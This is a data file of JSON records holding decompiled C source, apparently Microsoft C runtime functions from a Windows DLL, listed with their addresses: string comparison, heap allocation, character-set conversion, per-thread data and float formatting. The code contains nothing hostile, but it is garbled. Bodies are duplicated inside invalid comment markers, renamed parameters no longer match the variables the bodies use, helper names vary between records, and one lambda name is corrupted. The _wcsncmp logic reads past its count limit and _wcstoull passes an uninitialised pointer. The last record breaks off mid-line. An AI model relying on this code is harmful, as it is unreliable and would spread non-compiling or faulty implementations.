{"Function Name": "_wcsncmp", "Address": "10028a71", "Source Code": "int __cdecl _wcsncmp(wchar_t *str1, wchar_t *str2, size_t maxCount)\n{\n    \n    if (maxCount != 0) {\n        \n        while (maxCount-- != 0 && *str1 != L'\\0' && *str1 == *str2) {\n            \n            str1++;\n            \n            str2++;\n        }\n        \n        return (uint)(ushort)*str1 - (uint)(ushort)*str2;\n    }\n    \n    return maxCount;\n}"}
{"Function Name": "FID_conflict:_free", "Address": "10028b28", "Source Code": "void __cdecl FID_conflict__free(void *memoryPointer)\n{\n    \n    if (memoryPointer != (void *)0x0) {\n        \n        if (HeapFree(DAT_10050394, 0, memoryPointer) == 0) {\n            \n            int *errorPointer = (int *)FUN_100253b8();\n            \n            DWORD lastErrorCode = GetLastError();\n            \n            *errorPointer = FID_conflict____acrt_errno_from_os_error(lastErrorCode);\n        }\n    }\n}"}
{"Function Name": "__malloc_base", "Address": "10028b62", "Source Code": "LPVOID __cdecl __malloc_base(size_t requested_size)\n{\n    LPVOID allocated_memory_pointer; \n    \n    if (requested_size < 0xffffffe1) {\n        \n        if (requested_size == 0) {\n            requested_size = 1;\n        }\n        do {\n            \n            allocated_memory_pointer = HeapAlloc(DAT_10050394, 0, requested_size);\n            \n            if (allocated_memory_pointer != (LPVOID)0x0) {\n                return allocated_memory_pointer;\n            }\n        \n        } while (__callnewh(requested_size) != 0);\n    }\n    \n    *(undefined4 *)FUN_100253b8() = 0xc;\n    \n    return (LPVOID)0x0;\n}"}
{"Function Name": "_wcstoull", "Address": "10028c08", "Source Code": "undefined8 __cdecl _wcstoull(undefined4 input_value, undefined4 *output_pointer, uint flags)\n{\n    wchar_t *additional_output; \n    wchar_t **additional_output_pointer; \n    return FUN_10024324((__acrt_ptd **)0x0, \n                        make_c_string_character_source<>((undefined4 *)&stack0xffffffe8, input_value, output_pointer), \n                        additional_output_pointer, \n                        flags, \n                        '\\0'); \n}"}
{"Function Name": "__mbtowc_l", "Address": "10028c34", "Source Code": "int __cdecl __mbtowc_l(wchar_t *destinationCharPtr, char *sourceCharPtr, size_t sourceSizeInBytes, _locale_t localePtr)\n{\n    int returnValue; \n    uint unusedVar; \n    int localInfo; \n    localeinfo_struct localeInfo; \n    \n    if ((sourceCharPtr == (char *)0x0) || (sourceSizeInBytes == 0)) {\n        return 0; \n    }\n    \n    \n    if (*sourceCharPtr == '\\0') {\n        \n        if (destinationCharPtr == (wchar_t *)0x0) {\n            return 0; \n        }\n        *destinationCharPtr = L'\\0'; \n        return 0; \n    }\n    \n    \n    FUN_1001bfff(&localInfo, (__acrt_ptd **)localePtr);\n    \n    \n    if ((localeInfo.locinfo)->locale_name[2] == (wchar_t *)0x0) {\n        \n        if (destinationCharPtr != (wchar_t *)0x0) {\n            *destinationCharPtr = (ushort)(byte)*sourceCharPtr; \n        }\n        return 1; \n    }\n    \n    \n    returnValue = __isleadbyte_l((uint)(byte)*sourceCharPtr, &localeInfo);\n    if (returnValue == 0) {\n        \n        returnValue = MultiByteToWideChar((localeInfo.locinfo)->lc_collate_cp, 9, sourceCharPtr, 1, destinationCharPtr, (uint)(destinationCharPtr != (wchar_t *)0x0));\n        if (returnValue != 0) {\n            return 1; \n        }\n        *(undefined4 *)FUN_100253b8() = 0x2a; \n        return 0xffffffff; \n    } else {\n        \n        if ((int)(localeInfo.locinfo)->lc_codepage < 2) {\n            \n            if ((sourceSizeInBytes < (localeInfo.locinfo)->lc_codepage) || (sourceCharPtr[1] == '\\0')) {\n                *(undefined4 *)FUN_100253b8() = 0x2a; \n                return 0xffffffff; \n            }\n        } else {\n            \n            if ((int)sourceSizeInBytes < (int)(localeInfo.locinfo)->lc_codepage) {\n                *(undefined4 *)FUN_100253b8() = 0x2a; \n                return 0xffffffff; \n            }\n            \n            returnValue = MultiByteToWideChar((localeInfo.locinfo)->lc_collate_cp, 9, sourceCharPtr, (localeInfo.locinfo)->lc_codepage, destinationCharPtr, (uint)(destinationCharPtr != (wchar_t *)0x0));\n            if (returnValue == 0) {\n                *(undefined4 *)FUN_100253b8() = 0x2a; \n                return 0xffffffff; \n            }\n        }\n    }\n    return (localeInfo.locinfo)->lc_codepage; \n}"}
{"Function Name": "_mbtowc", "Address": "10028d2e", "Source Code": "int __cdecl _mbtowc(wchar_t *destinationWideChar, char *sourceMultiByteChar, size_t sourceSizeInBytes)\n{\n    \n    \n    \n    \n    \n    return __mbtowc_l(destinationWideChar, sourceMultiByteChar, sourceSizeInBytes, (_locale_t)0x0);\n}"}
{"Function Name": "__wctomb_s_l", "Address": "10028d48", "Source Code": "errno_t __cdecl\n__wctomb_s_l(int *_SizeConverted, char *_MbCh, size_t _SizeInBytes, wchar_t _WCh, _locale_t _Locale)\n{\n    DWORD DVar3; \n    errno_t eVar4; \n    int local_18; \n    int local_14; \n    int local_8 = 0; \n    \n    if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {\n        \n        if (_SizeConverted != (int *)0x0) {\n            *_SizeConverted = 0;\n        }\n        return 0; \n    }\n    \n    \n    if (_SizeConverted != (int *)0x0) {\n        *_SizeConverted = -1;\n    }\n    \n    \n    if (0x7fffffff < _SizeInBytes) {\n        *(undefined4 *)FUN_100253b8() = 0x16; \n        FUN_1001de96(); \n        return 0x16; \n    }\n    \n    \n    FUN_1001bfff(&local_18, (__acrt_ptd **)_Locale);\n    eVar4 = 0; \n    \n    \n    if (*(int *)(local_14 + 0xa8) == 0) {\n        \n        if ((ushort)_WCh < 0x100) {\n            \n            if (_MbCh != (char *)0x0 && _SizeInBytes != 0) {\n                *_MbCh = (char)_WCh;\n            }\n            \n            if (_SizeConverted != (int *)0x0) {\n                *_SizeConverted = 1;\n            }\n            goto LAB_10028dd5; \n        }\n        \n        if ((_MbCh != (char *)0x0) && (_SizeInBytes != 0)) {\n            _memset(_MbCh, 0, _SizeInBytes); \n        }\n    } else {\n        \n        int iVar2 = WideCharToMultiByte(*(UINT *)(local_14 + 8), 0, &_WCh, 1, _MbCh, _SizeInBytes, (LPCSTR)0x0, &local_8);\n        \n        \n        if (iVar2 == 0) {\n            DVar3 = GetLastError(); \n            \n            if (DVar3 == 0x7a) {\n                \n                if ((_MbCh != (char *)0x0) && (_SizeInBytes != 0)) {\n                    _memset(_MbCh, 0, _SizeInBytes);\n                }\n                *(undefined4 *)FUN_100253b8() = 0x22; \n                FUN_1001de96(); \n                goto LAB_10028dd5; \n            }\n        } else if (local_8 == 0) {\n            \n            if (_SizeConverted != (int *)0x0) {\n                *_SizeConverted = iVar2; \n            }\n            goto LAB_10028dd5; \n        }\n    }\n    \n    *(undefined4 *)FUN_100253b8() = 0x2a; \nLAB_10028dd5:\n    \n    if (local_8 != 0) {\n        *(uint *)(local_18 + 0x350) &= 0xfffffffd; \n    }\n    return eVar4; \n}"}
{"Function Name": "_wctomb_s", "Address": "10028e69", "Source Code": "errno_t __cdecl _wctomb_s(int *sizeConverted, char *mbCh, rsize_t sizeInBytes, wchar_t wCh)\n{\n    \n    \n    return __wctomb_s_l(sizeConverted, mbCh, sizeInBytes, wCh, (_locale_t)0x0);\n}"}
{"Function Name": "operator()<>", "Address": "10028e86", "Source Code": "\\*\nvoid operator()<>(int *resource_lock, int **thread_safe_value)\n{\n    \n    ___acrt_lock(*param_1);\n    \n    \n    LOCK();\n    \n    \n    **(int **)(**thread_safe_value + 0x48) += 1;\n    \n    \n    UNLOCK();\n    \n    \n    FUN_10028ec2();\n}\n*\\ \n \nvoid operator()<>(int *resource_lock, int **thread_safe_value)\n{\n    ___acrt_lock(*param_1);\n    LOCK();\n    **(int **)(**thread_safe_value + 0x48) += 1;\n    UNLOCK();\n    FUN_10028ec2();\n}"}
{"Function Name": "operator()<>", "Address": "10028ece", "Source Code": "\\*\nvoid operator()<>(int *input_value,int **pointer_to_pointer)\n{\n    int *memory_address; \n    ___acrt_lock(*input_value); \n    memory_address = *(int **)(**pointer_to_pointer + 0x48); \n    if (memory_address != (int *)0x0) { \n        LOCK(); \n        if (--*memory_address == 0 && memory_address != (int *)&DAT_1004e5e8) { \n            FID_conflict__free(memory_address); \n        }\n        UNLOCK(); \n    }\n    FUN_10028f23(); \n}\n*\\ \n \nvoid operator()<>(int *input_value,int **pointer_to_pointer)\n{\n    int *memory_address;\n    ___acrt_lock(*input_value);\n    memory_address = *(int **)(**pointer_to_pointer + 0x48);\n    if (memory_address != (int *)0x0) {\n        LOCK();\n        if (--*memory_address == 0 && memory_address != (int *)&DAT_1004e5e8) {\n            FID_conflict__free(memory_address);\n        }\n        UNLOCK();\n    }\n    FUN_10028f23();\n}"}
{"Function Name": "operator()<>", "Address": "10028f2f", "Source Code": "\\*\nvoid operator()<>(int *thread_lock, undefined4 *locale_data)\n{\n    \n    ___acrt_lock(*param_1);\n    \n    \n    replace_current_thread_locale_nolock(*(__acrt_ptd **)*locale_data, (__crt_locale_data *)0x0);\n    \n    \n    FUN_10028f6e();\n}\n*\\ \n \nvoid operator()<>(int *thread_lock, undefined4 *locale_data)\n{\n    ___acrt_lock(*param_1);\n    replace_current_thread_locale_nolock(*(__acrt_ptd **)*locale_data, (__crt_locale_data *)0x0);\n    FUN_10028f6e();\n}"}
{"Function Name": "operator()<>", "Address": "10028f7a", "Source Code": "\\*\nvoid operator()<>(int *thread_id, undefined4 *locale_data)\n{\n    \n    ___acrt_lock(*param_1);\n    \n    \n    replace_current_thread_locale_nolock(*(__acrt_ptd **)*locale_data, **(__crt_locale_data ***)locale_data[1]);\n    \n    \n    FUN_10028fbe();\n}\n*\\ \n \nvoid operator()<>(int *thread_id, undefined4 *locale_data)\n{\n    ___acrt_lock(*param_1);\n    replace_current_thread_locale_nolock(*(__acrt_ptd **)*locale_data, **(__crt_locale_data ***)locale_data[1]);\n    FUN_10028fbe();\n}"}
{"Function Name": "__acrt_lock_and_call<class_<lambda_b2ea41f6bbb362cd97d94c6828d90b61>_>", "Address": "10028fca", "Source Code": "\\*\nvoid __cdecl\n__acrt_lock_and_call<class_<lambda_b2ea41f6bbb362cd97d94c6828d90b61>_>\n(__acrt_lock_id param_1, <lambda_b2ea41f6bbb362cd97d94c6828d90b61> *param_2)\n{\n    \n    operator()<>((int *)&param_1, (undefined4 *)param_2);\n    \n    \n    return;\n}\n*\\ \n \nvoid __cdecl\n__acrt_lock_and_call<class_<lambda_b2ea41f6bbb362cd97d94c6828d90b61>_>\n(__acrt_lock_id param_1,<lambda_b2ea41f6bbb362cd97d94c6828d90b61> *param_2)\n{\n    operator()<>((int *)&param_1, (undefined4 *)param_2);\n    return;\n}"}
{"Function Name": "__acrt_lock_and_call<class_<lambda_6250bd4b2a391816dd638c3bf72b0bcb>_>", "Address": "10028ff2", "Source Code": "\\*\nvoid __cdecl\n__acrt_lock_and_call<class_<lambda_6250bd4b2a391816dd638c3bf72b0bcb>_>\n(__acrt_lock_id param_1,<lambda_6250bd4b2a391816dd638c3bf72b0bcb> *param_2)\n{\n    \n    operator()<>((int *)&param_1,(int **)param_2);\n    \n    \n    return;\n}\n*\\ \n \nvoid __cdecl\n__acrt_lock_and_call<class_<lambda_6250bd4b2a391816dd638c3bf72b0bcb>_>\n(__acrt_lock_id param_1,<lambda_6250bd4b2a391816dd638c3bf72b0bcb> *param_2)\n{\n    operator()<>((int *)&param_1,(int **)param_2);\n    return;\n}"}
{"Function Name": "__acrt_lock_and_call<class_<lambda_be2b3da3f62db62e9dad5dc70221a656>_>", "Address": "1002901a", "Source Code": "\\*\nvoid __cdecl\n__acrt_lock_and_call<class_<lambda_be2b3da3f62db62e9dad5dc70221a656>_>\n(__acrt_lock_id param_1,<lambda_be2b3da3f62db62e9dad5dc70221a656> *param_2)\n{\n    \n    \n    operator()<>((int *)&param_1, (undefined4 *)param_2);\n    \n    \n    return;\n}\n*\\ \n \nvoid __cdecl\n__acrt_lock_and_call<class_<lambda_be2b3da3f62db62e9dad5dc70221a656>_>\n(__acrt_lock_id param_1,<lambda_be2b3da3f62e9dad5dc70221a656> *param_2)\n{\n    operator()<>((int *)&param_1, (undefined4 *)param_2);\n    return;\n}"}
{"Function Name": "__acrt_lock_and_call<class_<lambda_e69574bed617af4e071282c136b37893>_>", "Address": "10029042", "Source Code": "\\*\nvoid __cdecl\n__acrt_lock_and_call<class_<lambda_e69574bed617af4e071282c136b37893>_>\n(__acrt_lock_id param_1,<lambda_e69574bed617af4e071282c136b37893> *param_2)\n{\n    \n    operator()<>((int *)&param_1,(int **)param_2);\n    \n    \n    return;\n}\n*\\ \n \nvoid __cdecl\n__acrt_lock_and_call<class_<lambda_e69574bed617af4e071282c136b37893>_>\n(__acrt_lock_id param_1,<lambda_e69574bed617af4e071282c136b37893> *param_2)\n{\n    operator()<>((int *)&param_1,(int **)param_2);\n    return;\n}"}
{"Function Name": "construct_ptd", "Address": "1002906a", "Source Code": "void __cdecl construct_ptd(__acrt_ptd *ptd_structure,__crt_locale_data **locale_data_pointer)\n{\n    \n    *(undefined4 *)(ptd_structure + 0x18) = 1;\n    \n    *(undefined **)ptd_structure = &DAT_1003ede0;\n    \n    *(undefined4 *)(ptd_structure + 0x350) = 1;\n    \n    *(undefined **)(ptd_structure + 0x48) = &DAT_1004e5e8;\n    \n    *(undefined2 *)(ptd_structure + 0x6c) = 0x43;\n    \n    *(undefined2 *)(ptd_structure + 0x172) = 0x43;\n    \n    *(undefined4 *)(ptd_structure + 0x34c) = 0;\n    \n    __acrt_lock_and_call<class_<lambda_e69574bed617af4e071282c136b37893>_>(5, (__crt_locale_data ***)&ptd_structure);\n    \n    __acrt_lock_and_call<class_<lambda_b2ea41f6bbb362cd97d94c6828d90b61>_>(4, &ptd_structure);\n    \n    \n    return;\n}"}
{"Function Name": "destroy_fls", "Address": "100290e3", "Source Code": "void destroy_fls(void *input_param)\n{\n    \n    if (input_param) {\n        \n        destroy_thread_data((__acrt_ptd *)input_param);\n        \n        free_memory(input_param);\n    }\n}"}
{"Function Name": "destroy_ptd", "Address": "10029104", "Source Code": "void __cdecl destroy_ptd(__acrt_ptd *thread_data)\n{\n    \n    if (*(undefined **)thread_data != &specific_address) {\n        \n        free_memory(*(undefined **)thread_data);\n    }\n    \n    free_memory(*(void **)(thread_data + 0x3c));\n    \n    free_memory(*(void **)(thread_data + 0x30));\n    \n    free_memory(*(void **)(thread_data + 0x34));\n    \n    free_memory(*(void **)(thread_data + 0x38));\n    \n    free_memory(*(void **)(thread_data + 0x28));\n    \n    free_memory(*(void **)(thread_data + 0x2c));\n    \n    free_memory(*(void **)(thread_data + 0x40));\n    \n    free_memory(*(void **)(thread_data + 0x44));\n    \n    free_memory(*(void **)(thread_data + 0x360));\n    \n    __acrt_lock_and_call<class_<lock_lambda_1>_>(5, (class_<lock_lambda_1> *)&thread_data);\n    \n    __acrt_lock_and_call<class_<lock_lambda_2>_>(4, (class_<lock_lambda_2> *)&thread_data);\n    return; \n}"}
{"Function Name": "replace_current_thread_locale_nolock", "Address": "100291ad", "Source Code": "void __cdecl replace_current_thread_locale_nolock(__acrt_ptd *thread_locale_data, __crt_locale_data *new_locale)\n{\n    \n    if (*(int *)(thread_locale_data + 0x4c) != 0) {\n        \n        ___acrt_release_locale_ref(*(int *)(thread_locale_data + 0x4c));\n        \n        \n        undefined **current_locale_pointer = *(undefined ***)(thread_locale_data + 0x4c);\n        \n        \n        if (current_locale_pointer != DAT_10050080 && current_locale_pointer != &PTR_DAT_1004e1f0 && current_locale_pointer[3] == (undefined *)0x0) {\n            \n            ___acrt_free_locale(current_locale_pointer);\n        }\n    }\n    \n    \n    *(__crt_locale_data **)(thread_locale_data + 0x4c) = new_locale;\n    \n    \n    if (new_locale != (__crt_locale_data *)0x0) {\n        ___acrt_add_locale_ref((int)new_locale);\n    }\n}"}
{"Function Name": "___acrt_freeptd", "Address": "100291f8", "Source Code": "void ___acrt_freeptd(void)\n{\n    \n    if (thread_local_storage_index != 0xffffffff) {\n        \n        void *retrieved_value = (void *)___acrt_FlsGetValue_4(thread_local_storage_index);\n        \n        \n        if (retrieved_value != (void *)0x0) {\n            \n            ___acrt_FlsSetValue_8(thread_local_storage_index, (LPVOID)0x0);\n            \n            destroy_fls(retrieved_value);\n        }\n    }\n}"}
{"Function Name": "FUN_10029224", "Address": "10029224", "Source Code": "__acrt_ptd * FUN_10029224(void)\n{\n    \n    DWORD lastErrorCode = GetLastError();\n    \n    \n    __acrt_ptd *threadLocalStoragePointer = (__acrt_ptd *)___acrt_FlsGetValue_4(threadLocalStorageKey);\n    \n    if ((threadLocalStorageKey == 0xffffffff) || (threadLocalStoragePointer == (__acrt_ptd *)0x0)) {\n        \n        if (___acrt_FlsSetValue_8(threadLocalStorageKey, (LPVOID)0xffffffff) == 0) goto LAB_100292cb;\n        \n        \n        threadLocalStoragePointer = (__acrt_ptd *)allocateMemory(1, 0x364);\n        \n        \n        if (threadLocalStoragePointer == (__acrt_ptd *)0x0) {\n            \n            ___acrt_FlsSetValue_8(threadLocalStorageKey, (LPVOID)0x0);\n        } else {\n            \n            if (___acrt_FlsSetValue_8(threadLocalStorageKey, threadLocalStoragePointer) != 0) {\n                \n                initializeThreadLocalStorage(threadLocalStoragePointer, (__crt_locale_data **)&DAT_10050080);\n                \n                \n                freeMemory((void *)0x0);\n                \n                \n                goto LAB_100292bb;\n            }\n            \n            ___acrt_FlsSetValue_8(threadLocalStorageKey, (LPVOID)0x0);\n        }\n        \n        freeMemory(threadLocalStoragePointer);\n    } else {\n        \n        if (threadLocalStoragePointer == (__acrt_ptd *)0xffffffff) goto LAB_100292cb;\n    }\nLAB_100292bb:\n    \n    if (threadLocalStoragePointer != (__acrt_ptd *)0x0) {\n        SetLastError(lastErrorCode);\n        return threadLocalStoragePointer;\n    }\nLAB_100292cb:\n    \n    SetLastError(lastErrorCode);\n    _abort();\n}"}
{"Function Name": "FUN_100292d8", "Address": "100292d8", "Source Code": "__acrt_ptd * get_acrt_ptd(void) \n{\n    __acrt_ptd *memory_ptr; \n    \n    if ((fls_key == 0xffffffff) || (memory_ptr = (__acrt_ptd *)get_fls_value(fls_key), memory_ptr == (__acrt_ptd *)0x0)) {\n        \n        if (set_fls_value(fls_key, (LPVOID)0xffffffff) == 0) goto LAB_1002936c; \n        \n        memory_ptr = (__acrt_ptd *)allocate_memory(1, 0x364);\n        \n        if (memory_ptr == (__acrt_ptd *)0x0) {\n            \n            set_fls_value(fls_key, (LPVOID)0x0);\n        } else {\n            \n            if (set_fls_value(fls_key, memory_ptr) != 0) {\n                \n                initialize_ptd(memory_ptr, (__crt_locale_data **)&locale_data);\n                \n                free_memory((void *)0x0);\n                return memory_ptr; \n            }\n            \n            set_fls_value(fls_key, (LPVOID)0x0);\n        }\n        \n        free_memory(memory_ptr);\n    } else {\n        \n        if (memory_ptr == (__acrt_ptd *)0xffffffff) goto LAB_1002936c;\n        return memory_ptr; \n    }\nLAB_1002936c:\n    _abort(); \n}"}
{"Function Name": "FUN_10029372", "Address": "10029372", "Source Code": "__acrt_ptd * FUN_10029372(void)\n{\n    \n    DWORD lastErrorCode = GetLastError();\n    \n    \n    __acrt_ptd *threadLocalStoragePointer = (__acrt_ptd *)___acrt_FlsGetValue_4(threadLocalStorageKey);\n    \n    if ((threadLocalStorageKey == 0xffffffff) || (threadLocalStoragePointer == (__acrt_ptd *)0x0)) {\n        \n        if (___acrt_FlsSetValue_8(threadLocalStorageKey, (LPVOID)0xffffffff) == 0) goto LAB_1002939c;\n        \n        \n        threadLocalStoragePointer = (__acrt_ptd *)__calloc_base(1, 0x364);\n        \n        \n        if (threadLocalStoragePointer == (__acrt_ptd *)0x0) {\n            \n            ___acrt_FlsSetValue_8(threadLocalStorageKey, (LPVOID)0x0);\n        } else {\n            \n            if (___acrt_FlsSetValue_8(threadLocalStorageKey, threadLocalStoragePointer) != 0) {\n                \n                initializeThreadLocalStorage(threadLocalStoragePointer, (__crt_locale_data **)&DAT_10050080);\n                \n                \n                freeMemory((void *)0x0);\n                \n                \n                goto LAB_10029418;\n            }\n            \n            ___acrt_FlsSetValue_8(threadLocalStorageKey, (LPVOID)0x0);\n            \n            \n            freeMemory(threadLocalStoragePointer);\n        }\n    } else {\n        \n        if (threadLocalStoragePointer == (__acrt_ptd *)0xffffffff) goto LAB_1002939c;\n    }\nLAB_10029418:\n    \n    if (threadLocalStoragePointer != (__acrt_ptd *)0x0) {\n        SetLastError(lastErrorCode);\n        return threadLocalStoragePointer;\n    }\nLAB_1002939c:\n    \n    SetLastError(lastErrorCode);\n    return (__acrt_ptd *)0x0;\n}"}
{"Function Name": "___acrt_update_locale_info", "Address": "1002946b", "Source Code": "void __cdecl ___acrt_update_locale_info(int locale_id, int *locale_pointer)\n{\n    \n    \n    if ((*locale_pointer != default_locale_value) && ((*(uint *)(locale_id + 0x350) & bitwise_condition_mask) == 0)) {\n        \n        *locale_pointer = (int)___acrt_update_thread_locale_data();\n    }\n}"}
{"Function Name": "FUN_10029498", "Address": "10029498", "Source Code": "void __cdecl FUN_10029498(int input_value, int *output_pointer)\n{\n    \n    \n    if ((*output_pointer != comparison_value) && ((*(uint *)(input_value + 0x350) & mask_value) == 0)) {\n        \n        *output_pointer = function_call();\n    }\n}"}
{"Function Name": "__acrt_fp_is_negative", "Address": "1002952d", "Source Code": "bool __cdecl __acrt_fp_is_negative(double *value_pointer)\n{\n    \n    \n    return (*(uint *)((int)value_pointer + 4) & 0x80000000) != 0;\n}"}
{"Function Name": "FUN_1002954b", "Address": "1002954b", "Source Code": "int __cdecl\nFUN_1002954b(double *param_1,undefined (*param_2) [16],uint param_3,char *param_4,uint param_5,\nsize_t param_6,char param_7,uint param_8,__acrt_ptd **param_9)\n{\nundefined4 *puVar1;\nint iVar2;\nundefined (*pauVar3) [16];\nuint uVar4;\nchar *pcVar5;\nuint uVar6;\nuint extraout_ECX;\nuint extraout_ECX_00;\nuint extraout_ECX_01;\nuint uVar7;\nchar *_Dst;\nchar *pcVar8;\nbool bVar9;\nulonglong uVar10;\nundefined8 uVar11;\nint local_34;\nint local_30;\nchar local_28;\nundefined4 local_24;\nint local_20;\nchar *local_1c;\nuint local_14;\nuint local_10;\nint local_c;\nuint local_8;\nif ((int)param_6 < 0) {\nparam_6 = 0;\n}\n(*param_2)[0] = 0;\nFUN_1001bfff(&local_34,param_9);\nif (param_3 <= param_6 + 0xb) {\npuVar1 = (undefined4 *)FUN_100253b8();\niVar2 = 0x22;\n*puVar1 = 0x22;\nFUN_1001de96();\ngoto LAB_10029846;\n}\nlocal_24 = *(undefined4 *)param_1;\nif ((*(uint *)((int)param_1 + 4) >> 0x14 & 0x7ff) == 0x7ff) {\niVar2 = fp_format_e(param_1,(char *)param_2,param_3,param_4,param_5,param_6,false,param_8,\n(__crt_locale_pointers *)0x0);\nif (iVar2 == 0) {\npauVar3 = FUN_100376b0(param_2,0x65);\nif (pauVar3 != (undefined (*) [16])0x0) {\n(*pauVar3)[0] = ((param_7 == '\\0') - 1U & 0xe0) + 0x70;\n(*pauVar3)[3] = 0;\n}\niVar2 = 0;\n}\nelse {\n(*param_2)[0] = 0;\n}\ngoto LAB_10029846;\n}\nif ((*(uint *)((int)param_1 + 4) & 0x80000000) != 0) {\n(*param_2)[0] = 0x2d;\nparam_2 = (undefined (*) [16])(*param_2 + 1);\n}\nlocal_10 = 0x3ff;\niVar2 = ((param_7 == '\\0') - 1 & 0xffffffe0) + 0x27;\nif ((*(uint *)((int)param_1 + 4) & 0x7ff00000) == 0) {\n(*param_2)[0] = 0x30;\nif ((*(uint *)param_1 | *(uint *)((int)param_1 + 4) & 0xfffff) == 0) {\nlocal_10 = 0;\n}\nelse {\nlocal_10 = 0x3fe;\n}\n}\nelse {\n(*param_2)[0] = 0x31;\n}\nlocal_1c = *param_2 + 1;\n_Dst = *param_2 + 2;\nif (param_6 == 0) {\n*local_1c = '\\0';\n}\nelse {\n*local_1c = ***(char ***)(local_30 + 0x88);\n}\nlocal_20 = iVar2;\nif (((*(uint *)((int)param_1 + 4) & 0xfffff) != 0) || (local_14 = 0, *(int *)param_1 != 0)) {\nlocal_8 = 0;\nlocal_c = 0x30;\nlocal_14 = 0xf0000;\ndo {\nif ((int)param_6 < 1) break;\nuVar10 = __aullshr((byte)local_c,*(uint *)((int)param_1 + 4) & local_14 & 0xfffff);\nuVar4 = (uint)(ushort)((short)uVar10 + 0x30);\nif (0x39 < uVar4) {\nuVar4 = uVar4 + iVar2;\n}\n*_Dst = (char)uVar4;\n_Dst = _Dst + 1;\nlocal_8 = local_8 >> 4 | local_14 << 0x1c;\nlocal_14 = local_14 >> 4;\nlocal_c = local_c + -4;\nparam_6 = param_6 - 1;\n} while (-1 < (short)local_c);\nif ((-1 < (short)local_c) &&\n(uVar10 = __aullshr((byte)local_c,*(uint *)((int)param_1 + 4) & local_14 & 0xfffff),\npcVar8 = _Dst, 8 < (ushort)uVar10)) {\nwhile( true ) {\npcVar5 = pcVar8 + -1;\nif ((*pcVar5 != 'f') && (*pcVar5 != 'F')) break;\n*pcVar5 = '0';\npcVar8 = pcVar5;\n}\nif (pcVar5 == local_1c) {\npcVar8[-2] = pcVar8[-2] + '\\x01';\n}\nelse if (*pcVar5 == '9') {\n*pcVar5 = (char)local_20 + ':';\n}\nelse {\n*pcVar5 = *pcVar5 + '\\x01';\n}\n}\n}\nif (0 < (int)param_6) {\n_memset(_Dst,0x30,param_6);\n_Dst = _Dst + param_6;\n}\nif (*local_1c == '\\0') {\n_Dst = local_1c;\n}\n*_Dst = ((param_7 == '\\0') - 1U & 0xe0) + 0x70;\nuVar10 = __aullshr(0x34,*(uint *)((int)param_1 + 4));\nuVar4 = (uint)uVar10 & 0x7ff;\nuVar6 = uVar4 - local_10;\nuVar4 = (uint)(uVar4 < local_10);\nuVar7 = -uVar4;\nif (uVar4 == 0) {\n_Dst[1] = '+';\n}\nelse {\n_Dst[1] = '-';\nbVar9 = uVar6 != 0;\nuVar6 = -uVar6;\nuVar7 = -(uVar7 + bVar9);\n}\npcVar8 = _Dst + 2;\n*pcVar8 = '0';\nlocal_1c = pcVar8;\nif (-1 < (int)uVar7) {\nif (((int)uVar7 < 1) && (uVar6 < 1000)) {\nLAB_100297ef:\nif (((int)uVar7 < 0) || ((uVar4 = uVar7, (int)uVar7 < 1 && (uVar6 < 100)))) goto LAB_10029814;\n}\nelse {\nuVar11 = __alldvrm(uVar6,uVar7,1000,0);\nlocal_20 = (int)((ulonglong)uVar11 >> 0x20);\n*pcVar8 = (char)uVar11 + '0';\npcVar8 = _Dst + 3;\nuVar6 = extraout_ECX;\nuVar7 = 0x30;\nuVar4 = 0x30;\nif (pcVar8 == local_1c) goto LAB_100297ef;\n}\nuVar7 = 0x30;\nuVar11 = __alldvrm(uVar6,uVar4,100,0);\nlocal_20 = (int)((ulonglong)uVar11 >> 0x20);\n*pcVar8 = (char)uVar11 + '0';\npcVar8 = pcVar8 + 1;\nuVar6 = extraout_ECX_00;\n}\nLAB_10029814:\nif ((pcVar8 != local_1c) || ((-1 < (int)uVar7 && ((0 < (int)uVar7 || (9 < uVar6)))))) {\nuVar11 = __alldvrm(uVar6,uVar7,10,0);\n*pcVar8 = (char)uVar11 + '0';\npcVar8 = pcVar8 + 1;\nuVar6 = extraout_ECX_01;\n}\niVar2 = 0;\n*pcVar8 = (char)uVar6 + '0';\npcVar8[1] = '\\0';\nLAB_10029846:\nif (local_28 != '\\0') {\n*(uint *)(local_34 + 0x350) = *(uint *)(local_34 + 0x350) & 0xfffffffd;\n}\nreturn iVar2;\n}\nLocal Variable: local_8 : undefined4\nLocal Variable: local_c : undefined4\nLocal Variable: local_10 : undefined4\nLocal Variable: local_14 : undefined4\nLocal Variable: local_1c : undefined4\nLocal Variable: local_20 : undefined4\nLocal Variable: local_24 : undefined4\nLocal Variable: local_28 : undefined1\nLocal Variable: local_30 : undefined4\nLocal Variable: local_34 : undefined4"}
{"Function Name": "fp_format_e", "Address": "1002985f", "Source Code": "int __cdecl\nfp_format_e(double *param_1, char *param_2, uint param_3, char *param_4, uint param_5, int param_6,\nbool param_7, uint param_8, __crt_locale_pointers *param_9)\n{\n    int iVar1; \n    uint uVar2; \n    int local_10[3]; \n    \n    FUN_10032004(*(uint *)param_1, *(uint *)((int)param_1 + 4), param_6 + 1, local_10, param_4, param_5);\n    \n    \n    uVar2 = (param_3 != 0xffffffff) ? (param_3 - (local_10[0] == 0x2d) - (uint)(0 < param_6)) : 0xffffffff;\n    \n    iVar1 = ___acrt_fp_strflt_to_string((undefined8 *)(param_2 + (uint)(0 < param_6) + (uint)(local_10[0] == 0x2d)),\n                                         uVar2, param_6 + 1, (int)local_10);\n    \n    \n    if (iVar1 == 0) {\n        \n        iVar1 = fp_format_e_internal(param_2, param_3, param_6, param_7, param_8, (_strflt *)local_10, false, param_9);\n    } else {\n        \n        *param_2 = '\\0';\n    }\n    \n    \n    return iVar1;\n}"}
{"Function Name": "fp_format_e_internal", "Address": "100298fa", "Source Code": "int __cdecl\nfp_format_e_internal\n(char *param_1, uint param_2, int param_3, bool param_4, uint param_5, _strflt *param_6,\nbool param_7, __crt_locale_pointers *param_8)\n{\n    errno_t eVar2; \n    int iVar3; \n    int iVar4; \n    char *pcVar5; \n    \n    iVar4 = (param_3 < 1) ? 0 : param_3;\n    \n    if (iVar4 + 9U < param_2) {\n        FUN_1001bfff(NULL, (__acrt_ptd **)param_8); \n        \n        if (param_7) {\n            shift_bytes(param_1, param_2, param_1 + (*(int *)param_6 == 0x2d), (uint)(0 < param_3));\n        }\n        pcVar5 = param_1; \n        \n        if (*(int *)param_6 == 0x2d) {\n            *param_1 = '-';\n            pcVar5 = param_1 + 1; \n        }\n        \n        if (0 < param_3) {\n            *pcVar5 = pcVar5[1]; \n            pcVar5++; \n            *pcVar5 = ***(char ***)(0 + 0x88); \n        }\n        \n        pcVar5 += 